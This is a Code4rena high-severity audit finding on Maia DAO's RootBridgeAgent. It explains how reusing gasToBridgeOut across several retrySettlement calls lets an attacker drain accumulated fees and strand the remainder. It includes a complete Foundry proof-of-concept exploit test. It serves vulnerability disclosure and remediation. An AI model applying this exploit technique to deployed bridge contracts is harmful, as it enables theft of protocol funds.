---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/bridge
  - sector/governance
  - sector/lending
protocol: "[[Maia DAO Ecosystem]]"
auditors:
  - "[[Voyvoda]]"
report: "https://code4rena.com/reports/2023-05-maia"
genome:
  - "[[frozen-funds]]"
  - "[[direct-drain]]"
  - "[[reward-accounting]]"
  - "[[bridge-stuck-asset]]"
  - "[[commitment-uniqueness]]"
---
# [H-11] An attacker can steal Accumulated Awards from `RootBridgeAgent` by abusing `retrySettlement()`

- id: 26045
- impact: HIGH
- protocol: [[Maia DAO Ecosystem]]
- reporter: Voyvoda (Code4rena)
- source: https://code4rena.com/reports/2023-05-maia

## Summary


This bug report is about a vulnerability in the Accumulated Awards inside the RootBridgeAgent.sol code. The bug can be exploited to steal Accumulated Awards and cause awards to become stuck. The bug is caused by the gas state related code in the RootBridgeAgent.sol, which includes the initialGas, userFeeInfo, and accumulatedFees state variables.

The bug is exploited by triggering multiple callOutAndBridge invocations from a Branch Chain, with some assets and extra data that will call callOutAndBridge on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain). However, the attacker will set minimum depositedGas to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain; therefore, failing a number of settlements. The attacker will then follow with a callOutAndBridge from a Branch Chain that contains extra data for the MutlicallRouter and for the VirtualAccount to call retrySettlement for every "failed" settlement. Since there will be multiple retrySettlement invocations inside a single anyExecute, at some point the gasToBridgeOut sent to each settlement will become > the deposited gas and the attacker will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem their profit on the Branch Chain, since they get a gas refund. Therefore, there will also be a mismatch between accumulatedRewards and the native currency in RootBridgeAgent, causing sweep() to revert and any accumulatedRewards left will be bricked.

The fix recommended for this issue was saving the available gas and clearing the gasToBridgeOut after each manageGasOut in order to avoid this double spending and using available gas in payExecutionGas. 0xLightt (Maia) commented that they recognize the audit's findings on Anycall Gas Management, but these will not be rectified due to the upcoming migration of this section to LayerZero.

## Details


### Lines of code

<https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409>

The Accumulated Awards inside `RootBridgeAgent.sol` can be stolen. The Accumulated Awards state will be compromised and awards will be stuck.


### Proof of Concept
*Note: An end-to-end coded PoC is at the end of the PoC section.*

### Gas state

The gas related state inside `RootBridgeAgent` consists of:

- `initialGas`: a checkpoint that records `gasleft()` at the start of `anyExecute` that has been called by `Multichain` when we have a cross-chain call.
- `userFeeInfo`: this is a struct that contains `depositedGas` which is the total amount of gas that the user has paid for on a `BranchChain`. The struct also contains `gasToBridgeOut`, which is the amount of gas to be used for further cross-chain executions. The assumption is that `gasToBridgeOut < depositedGas` which is checked at the start of `anyExecute(...)`.
- At the end of `anyExecute(...)`: the function `_payExecutionGas()` is invoked that calculates the supplied gas available for execution on the Root `avaliableGas = _depositedGas - _gasToBridgeOut` and then a check is performed if `availableGas` is enough to cover `minExecCost`, (which uses the `initialGas` checkpoint and subtracts a second `gasleft()` checkpoint to represent the end of execution on the Root). The difference between `availableGas` and `minExecCost` is the profit for the protocol is recorded inside `accumulatedFees` state variable.

```solidity
function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain)
        internal
    {
        //reset initial remote execution gas and remote execution fee information
        delete(initialGas);
        delete(userFeeInfo);

        if (_fromChain == localChainId) return;

        //Get Available Gas
        uint256 availableGas = _depositedGas - _gasToBridgeOut;

        //Get Root Environment Execution Cost
        uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());

        //Check if sufficient balance
        if (minExecCost > availableGas) {
            _forceRevert();
            return;
        }

        //Replenish Gas
        _replenishGas(minExecCost);

        //Account for excess gas
        accumulatedFees += availableGas - minExecCost;
    }
```

### Settlements

These are records of tokens that are "bridged out" (transferred) through the `RootBridgeAgent` to a `BranchBridgeAgent`. By default, when a settlement is created it is "successful", unless the execution on the Branch Chain fails and `anyFallback(...)` is called on the `RootBridgeAgent`, which will set the settlement status as "failed".

An example way to create a settlement, will be to "bridge out" some of the assets from `BranchBridgeAgent` to `RootBridgeAgent` and embed extra data that represents another bridge operation from `RootBridgeAgent` to `BranchBridgeAgent`. This flow passes through the `MulticallRootRouter` and could be the same branch agent as the first one or different. At this point, a settlement will be created. Moreover, a settlement could fail, for example, because of insufficient `gasToBridgeOut` provided by the user. In that case, `anyFallback` is triggered on the `RootBridgeAgent`, failing the settlement. At this time, `retrySettlement()` becomes available to call for the particular settlement.

### The attack

Let's first examine closely the `retrySettlement()` function:

```solidity
function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }
```

If `initialGas == 0`, it is assumed that someone directly calls `retrySettlement(...)` and therefore has to deposit gas (`msg.value`). However, if `initialGas > 0`, it is assumed that `retrySettlement(...)` could be part of an `anyExecute(...)` call that contained instructions for the `MulticallRootRouter` to do the call through a `VirtualAccount`. Let's assume the second scenario where `initialGas > 0` and examine the internal `_retrySettlement`:

First, we have the call to `_manageGasOut(...)`, where again if `initialGas > 0`, we assume that the `retrySettlement(...)` is within `anyExecute`; therefore, the `userFeeInfo` state is already set. From there, we perform a `_gasSwapOut(...)` with `userFeeInfo.gasToBridgeOut` where we swap the `gasToBridgeOut` amount of `wrappedNative` for gas tokens that are burned. Then, back in the internal `_retrySettlement(...)`, the new gas is recorded in the settlement record and the message is sent to a Branch Chain via `anyCall`.

The weakness here, is that after we retry a settlement with `userFeeInfo.gasToBridgeOut` we do not set `userFeeInfo.gasToBridgeOut = 0`. Which if we perform only 1 `retrySettlement(...)`, it is not exploitable; however, if we embed in a single `anyExecute(...)` in several `retrySettlement(...)` calls, it becomes obvious that we can pay 1 time for `gasToBridgeOut` on a Branch Chain and use it multiple times on the `RootChain` to fuel the many `retrySettlement(...)` calls.

The second feature that will be part of the attack, is that on a Branch Chain we get refunded for the excess of `gasToBridgeOut` that wasn't used for execution on the Branch Chain.

```solidity
function _retrySettlement(uint32 _settlementNonce) internal returns (bool) {
        //Get Settlement
        Settlement memory settlement = getSettlement[_settlementNonce];

        //Check if Settlement hasn't been redeemed.
        if (settlement.owner == address(0)) return false;

        //abi encodePacked
        bytes memory newGas = abi.encodePacked(_manageGasOut(settlement.toChain));

        //overwrite last 16bytes of callData
        for (uint256 i = 0; i < newGas.length;) {
            settlement.callData[settlement.callData.length - 16 + i] = newGas[i];
            unchecked {
                ++i;
            }
        }

        Settlement storage settlementReference = getSettlement[_settlementNonce];

        //Update Gas To Bridge Out
        settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut;

        //Set Settlement Calldata to send to Branch Chain
        settlementReference.callData = settlement.callData;

        //Update Settlement Status
        settlementReference.status = SettlementStatus.Success;

        //Retry call with additional gas
        _performCall(settlement.callData, settlement.toChain);

        //Retry Success
        return true;
    }
```

An attacker will trigger some number of `callOutAndBridge(...)` invocations from a Branch Chain, with some assets and extra data that will call `callOutAndBridge(...)` on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain). However, the attacker will set minimum `depositedGas` to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain; therefore, failing a number of settlements. The attacker will then follow with a `callOutAndBridge(...)` from a Branch Chain that contains extra data for the `MutlicallRouter` and for the `VirtualAccount` to call `retrySettlement(...)` for every "failed" settlement. Since we will have multiple `retrySettlement(...)` invocations inside a single `anyExecute`, at some point the `gasToBridgeOut` sent to each settlement will become `>` the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem their profit on the Branch Chain, since they get a gas refund. Therefore, there will also be a mismatch between `accumulatedRewards` and the native currency in `RootBridgeAgent`, causing `sweep()` to revert and any `accumulatedRewards` left will be bricked.

### Coded PoC

Copy the two functions `testGasIssue` and `_prepareDeposit` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testGasIssue -vv`.

Result: the attacker starts with `1000000000000000000` wei (1 ether) and has `1169999892307980000` wei (>1 ether) after the execution of the attack (the end number could be slightly different, depending on foundry version), which is a mismatch between `accumulatedRewards` and the amount of WETH in the contract.

*Note - there are console logs added from the developers in some of the mock contracts. Consider commenting them out for clarity of the output.*

```solidity
function testGasIssue() public {
        testAddLocalTokenArbitrum();
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE START---------------------");
        console2.log("---------------------------------------------------------");
        // Accumulate rewards in RootBridgeAgent
        address some_user = address(0xAAEE);
        hevm.deal(some_user, 1.5 ether);
        // Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees
        bytes memory empty_params = abi.encode(bytes1(0x00));
        hevm.prank(some_user);
        avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);

        // Get the global(root) address for the avax H mock token
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);

        // Attacker starts with 1 ether
        address attacker = address(0xEEAA);
        hevm.deal(attacker, 1 ether);
        
        // Mint 1 ether of the avax mock underlying token
        hevm.prank(address(avaxPort));
        
        MockERC20(address(avaxMockAssetToken)).mint(attacker, 1 ether);
        
        // Attacker approves the underlying token
        hevm.prank(attacker);
        MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort), 1 ether);

        
        // Print out the amounts of WrappedNative & AccumulateAwards state 
        console2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES START", multicallBridgeAgent.accumulatedFees());

        // Attacker's underlying avax mock token balance
        console2.log("Attacker underlying token balance avax", avaxMockAssetToken.balanceOf(attacker));

        // Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail
        // We will have to mock this fail since we don't have the MultiChain contracts, but the provided 
        // Mock Anycall has anticipated for that

        DepositInput memory deposit = _prepareDeposit();
        uint128 remoteExecutionGas = 2_000_000_000;

        Multicall2.Call[] memory calls = new Multicall2.Call[](0);

        OutputParams memory outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        bytes memory params = abi.encodePacked(bytes1(0x02),abi.encode(calls, outputParams, avaxChainId));

        console2.log("ATTACKER ETHER BALANCE START", attacker.balance);

        // Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall
        // Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)
        MockAnycall(local`AnyCall`Address).toggleFallback(1);

        // execute
        hevm.prank(attacker);
        // in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether }(params, deposit, remoteExecutionGas);

        // Switch to normal mode 
        MockAnycall(local`AnyCall`Address).toggleFallback(0);
        // this will call anyFallback() on the Root and Fail the settlement
        MockAnycall(local`AnyCall`Address).testFallback();

        // Repeat for 1 more settlement
        MockAnycall(local`AnyCall`Address).toggleFallback(1);
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether}(params, deposit, remoteExecutionGas);
        
        MockAnycall(local`AnyCall`Address).toggleFallback(0);
        MockAnycall(local`AnyCall`Address).testFallback();
        
        // Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attack 
        console2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK", multicallBridgeAgent.accumulatedFees());

        // Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since 
        // initialGas > 0 because we execute the calls as a part of an anyExecute()
        Multicall2.Call[] memory malicious_calls = new Multicall2.Call[](2);

        bytes4 selector = bytes4(keccak256("retrySettlement(uint32,uint128)"));

        malicious_calls[0] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,1,0)});
        malicious_calls[1] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,2,0)});
        // malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});
        
        outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        params = abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls, outputParams, avaxChainId));

        // At this point root now has ~1.1 
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.1 ether}(params, deposit, 0.09 ether);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("ATTACKER underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
        console2.log("ATTACKER global avax h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));

        console2.log("ATTACKER ETHER BALANCE END", attacker.balance);
        console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES END", multicallBridgeAgent.accumulatedFees());
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE END ----------------------");
        console2.log("---------------------------------------------------------");

    }

    function _prepareDeposit() internal returns(DepositInput memory) {
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        uint256 amount1 = 500;
        uint256 amount2 = 500;

        uint24 toChain = rootChainId;

        return DepositInput({
            hToken:addr1,
            token:addr2,
            amount:amount1,
            deposit:amount2,
            toChain:toChain
        });

    }
```

### Recommendation

It is hard to conclude a particular fix, but consider setting `userFeeInfo.gasToBridgeOut = 0` after `retrySettlement`  as part of the mitigation.

### Assessed type

Context

**[0xBugsy (Maia) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-05-maia-findings/issues/645#issuecomment-1632820616):**
 > The fix recommended for this issue was saving the available gas and clearing the `gasToBridgeOut` after each `manageGasOut` in order to avoid this double spending and using available gas in `payExecutionGas`.

**[Trust (judge) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/645#issuecomment-1647992146):**
 > Loss of yield = loss of funds. High impact from my perspective.

**[0xLightt (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/645#issuecomment-1708814750):**
> We recognize the audit's findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

***
